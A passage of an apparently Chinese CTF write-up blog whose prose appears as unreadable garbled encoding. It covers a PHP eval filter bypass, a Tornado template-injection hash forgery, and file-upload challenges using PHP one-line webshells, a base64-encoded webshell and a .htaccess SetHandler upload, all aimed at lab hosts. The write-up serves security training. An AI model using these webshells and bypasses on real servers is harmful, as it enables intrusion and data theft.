</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åçœ‹åˆ«äººçš„wpåš<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/107976892">https://blog.csdn.net/vanarrow/article/details/107976892</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/echoDetected/p/13091486.html">https://www.cnblogs.com/echoDetected/p/13091486.html</a>  </p>
<p>å½“ä¼ å…¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> num<br><span class="hljs-comment">//å°±èƒ½ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Ÿ</span><br><span class="hljs-comment">//æ­¤æ—¶çš„&quot;nmu&quot;ä¸ç­‰äº&quot; num&quot;,ç»•è¿‡äº†ï¼š</span><br><br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br><br><span class="hljs-comment">//ä½†æ˜¯åœ¨evalé‡Œè§£æçš„æ—¶å€™ä¼šæŠŠç©ºæ ¼ç§»é™¤ï¼Œè¿™æ ·å°±èƒ½å®ç°ç»•è¿‡</span><br></code></pre></td></tr></table></figure>
<p>åœ¨æœ¬åœ°è¯•äº†ä¸€ä¸‹ï¼Œç¡®å®æ˜¯è¿™æ ·:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>. <span class="hljs-title function_ invoke__">phpinfo</span>().<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>.<span class="hljs-string">&#x27; phpinfo()&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥æ€»ç»“åˆ«äººçš„wpï¼š<br>1.ç”¨â€ numâ€æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼›<br>2.var_dumpå‡½æ•°æ¥è¾“å‡ºå›æ˜¾ï¼Œç”¨file_get_contents()æ¥åŠ è½½flagæ–‡ä»¶chr()å‡½æ•°æ¥ç»•è¿‡éæ³•å­—ç¬¦ï¼›</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;&#x27;</span><br>s=s+<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter you str,then i will give you them ascii:\n&quot;</span>)<br>o=<span class="hljs-number">0</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    o=<span class="hljs-built_in">ord</span>(i)<br>    <span class="hljs-built_in">print</span>(o)<br></code></pre></td></tr></table></figure>
<p>ç„¶ååˆ°åšé¢˜ï¼š<br>æŸ¥çœ‹æ ¹ç›®å½•ï¼š</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sml">/calc.php? num=var_dump(scandir(chr(<span class="hljs-number">47</span>)))<br><br>å›æ˜¾ï¼š<br><span class="hljs-built_in">array</span>(<span class="hljs-number">24</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;.dockerenv&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;bin&quot;</span> [<span class="hljs-number">4</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;boot&quot;</span> [<span class="hljs-number">5</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;dev&quot;</span> [<span class="hljs-number">6</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;etc&quot;</span> [<span class="hljs-number">7</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;f1agg&quot;</span> [<span class="hljs-number">8</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;home&quot;</span> [<span class="hljs-number">9</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;lib&quot;</span> [<span class="hljs-number">10</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;lib64&quot;</span> [<span class="hljs-number">11</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;media&quot;</span> [<span class="hljs-number">12</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;mnt&quot;</span> [<span class="hljs-number">13</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;opt&quot;</span> [<span class="hljs-number">14</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;proc&quot;</span> [<span class="hljs-number">15</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;root&quot;</span> [<span class="hljs-number">16</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;run&quot;</span> [<span class="hljs-number">17</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;sbin&quot;</span> [<span class="hljs-number">18</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;srv&quot;</span> [<span class="hljs-number">19</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;start.sh&quot;</span> [<span class="hljs-number">20</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;sys&quot;</span> [<span class="hljs-number">21</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tmp&quot;</span> [<span class="hljs-number">22</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;usr&quot;</span> [<span class="hljs-number">23</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;var&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>è¯»å–flagï¼š</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node5.buuoj.cn:<span class="hljs-number">28453</span>/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)))<br><br><span class="hljs-attribute">string</span>(<span class="hljs-number">43</span>) <span class="hljs-string">&quot;flag&#123;89404a0c-0948-4a18-9f87-40f1050cc23f&#125; &quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="notice-4"><a href="#notice-4" class="headerlink" title="notice:"></a>notice:</h2><p>scandir( )<br>è¿™æ˜¯ä¸€ä¸ªåœ¨Cè¯­è¨€ä¸­ç”¨äºæ‰«æç›®å½•å†…å®¹çš„å‡½æ•°ï¼Œå®ƒå…è®¸å¼€å‘è€…æ£€ç´¢ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ä¿¡æ¯ã€‚è¿™ä¸ªå‡½æ•°åœ¨Linuxç³»ç»Ÿç¼–ç¨‹ä¸­éå¸¸æœ‰ç”¨ï¼Œå°¤å…¶æ˜¯å½“ä½ éœ€è¦å¤„ç†æ–‡ä»¶ç³»ç»Ÿæˆ–è€…è¿›è¡Œç›®å½•æ“ä½œæ—¶ã€‚</p>
<p>var_dump( )ï¼š<br>è¿™æ˜¯PHPçš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè¾“å‡ºå˜é‡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»å‹å’Œå€¼ã€‚</p>
<p>file_get_contents( )ï¼š<br>è¿™æ˜¯PHPçš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè¯»å–æ–‡ä»¶å†…å®¹å¹¶è¿”å›ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>chr( )ï¼š<br>è¿™æ˜¯PHPçš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºå°†ASCIIç å€¼è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ã€‚</p>
<h1 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h1><p>æ¨¡æ¿æ³¨å…¥é¢˜<br>æ²¡æ¥è§¦è¿‡ï¼Œæƒ³ç›´æ¥å»çœ‹wpäº†<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73734159/article/details/134360691">https://blog.csdn.net/m0_73734159/article/details/134360691</a><br>å¾ˆè¯¦ç»†ï¼Œ  </p>
<p>è®°ä¸€å›tornadoæ¨¡æ¿æ³¨å…¥ï¼Œè™½ç„¶æ²¡åšè¿‡ä¸¤é“æ¨¡æ¿æ³¨å…¥çš„é¢˜  </p>
<p>ç‚¹å¼€flagçœ‹åˆ°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/flag.txt<br>flag <span class="hljs-keyword">in</span> /fllllllllllllag<br><br>url:/file?filename=/flag.txt&amp;filehash=02521e013bf12f2ed07267cbbb4476da<br></code></pre></td></tr></table></figure>
<p>ä¿®æ”¹filehash:<br>&#x2F;error?msg&#x3D;Error<br>éªŒè¯å®Œåç¡®å®šä½¿ç”¨tornadoæ¨¡æ¿æ³¨å…¥ï¼ˆwpï¼‰  </p>
<p>æŸ¥çœ‹hintå¾—åˆ°è®¡ç®—å…¬å¼ md5(cookie_secret+md5(filename))<br>çŸ¥é“è¦æ‹¿åˆ°cookie_secret,<br>ç”¨handler.sttingsæŸ¥çœ‹ç¯å¢ƒå˜é‡  </p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;<span class="hljs-number">42b45411</span>-b944-<span class="hljs-number">4058</span>-a294-92333eecacef&#x27;&#125;<br></code></pre></td></tr></table></figure>
<p>è®¡ç®—hashå€¼<br>md5(&#x2F;fllllllllllllag)&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>cookie_secret&#x3D;42b45411-b944-4058-a294-92333eecacef<br>md5(md5(&#x2F;fllllllllllllag)+cookie_secret)&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p>
<p>æœ€åpayloadï¼š<br>&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p>
<h1 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p>è¿™é¢˜çš„noteå†™è¿‡äº†ï¼Œæœ¬æ›¿æ¢ææ²¡äº†ï¼Œè¿™æ¬¡å°±ç‹¬ç«‹åšè¿‡å½“æ¸©ä¹ å§<br>å¼€å±€è‰¾å…‹å’Œå­™ç¬‘å·ï¼Œjpegç›´æ¥ä¼ ä¹Ÿä¼ ä¸äº†ï¼Œæ–‡ä»¶æœ‰1mé™åˆ¶ï¼Œ<br>é¢˜ç›®ä¸€ç›´ä¸æç¤ºæ”¹ä¸Šä¼ ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶æœ‰ç‚¹éš¾å—ï¼Œ<br>æœ€åè¯•å‡ºæ¥mmieä¼  image&#x2F;png å°±è¡Œ<br>ç›´æ¥ä¼ äº†  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>411<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryPX5AuupbBQqkGiE6<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;php.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ä¸€é”®å»ä¸–</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/php.png succesfully uploaded!</span><br></code></pre></td></tr></table></figure>
<p>ç›´æ¥èšå‰‘è®¿é—®è®¿é—®ä¸äº†ï¼Œåº”è¯¥å°±æ˜¯ç›®å½•ä¸ä¼šè¿›è¡Œphpè§£æçš„åŸå› <br>åˆ©ç”¨.htaccess,ä¸Šä¼ .htaccessæ–‡ä»¶</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>340<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvBTzoKhzTjekoPjH<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">SetHandler application/x-httpd-php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ä¸€é”®å»ä¸–</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/.htaccess succesfully uploaded!</span><br></code></pre></td></tr></table></figure>
<p>èšå‰‘è®¿é—®<br><a target="_blank" rel="noopener" href="http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png">http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png</a><br>æˆåŠŸ  </p>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>æ¼æ´è¯¦æƒ…ï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44032232/article/details/108998564">https://blog.csdn.net/weixin_44032232/article/details/108998564</a></p>
<h1 id="ACTF-uploadï¼ˆæœªè§£å‡ºï¼‰"><a href="#ACTF-uploadï¼ˆæœªè§£å‡ºï¼‰" class="headerlink" title="ACTF uploadï¼ˆæœªè§£å‡ºï¼‰"></a>ACTF uploadï¼ˆæœªè§£å‡ºï¼‰</h1><p>åˆè·‘å»actfåç‰¢äº†ğŸ˜­ï¼Œåšä¸å‡ºæ¥ä¹ŸæŠŠè¿›åº¦æ”¾è¿™</p>
<p>å…ˆè¦æ³¨å†Œç”¨æˆ·æ¥ç™»å½•ï¼Œè¯•äº†adminè´¦æˆ·ï¼ŒæœåŠ¡å™¨ä¸ç»™  </p>
<p>ä¼ æ­£å¸¸å›¾ç‰‡<br><a target="_blank" rel="noopener" href="http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg">http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg</a><br>è®¿é—®æ­£å¸¸å›æ˜¾å›¾ç‰‡  </p>
<p>ä¼ é©¬ï¼š<br><a target="_blank" rel="noopener" href="http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php">http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php</a><br>ä¸å›æ˜¾ä»£ç ï¼Œå›æ˜¾ï¼š  </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Uploaded Image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ˜¯base64ç¼–ç åçš„é©¬<br>è¯•ä¸€ä¸‹ç›´æ¥ä¸Šä¼ base64ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+<br></code></pre></td></tr></table></figure>
<p>ä¸è¡Œ  </p>
<p>çœ‹ä¸€ä¸‹då¯¼çš„åˆ†æï¼š  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml">å…³é”®åˆ†æ<br>æœåŠ¡å™¨å¤„ç†é€»è¾‘ï¼š<br><br>ä¸Šä¼ çš„å†…å®¹è¢«åŒ…è£¹åœ¨ <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,...&quot;</span>&gt;</span> ä¸­ï¼Œè¯´æ˜æœåŠ¡å™¨å°†æ–‡ä»¶å†…å®¹å¼ºåˆ¶è½¬æ¢ä¸º Base64 å›¾ç‰‡ã€‚<br><br>ä½†è¿”å›çš„ Base64 æ•°æ® (PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==) è§£ç åæ­£æ˜¯ä½ ä¸Šä¼ çš„åŸå§‹ä»£ç ï¼š<br><br>php<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&quot;z&quot;</span>]);</span><span class="hljs-tag">&lt;/<span 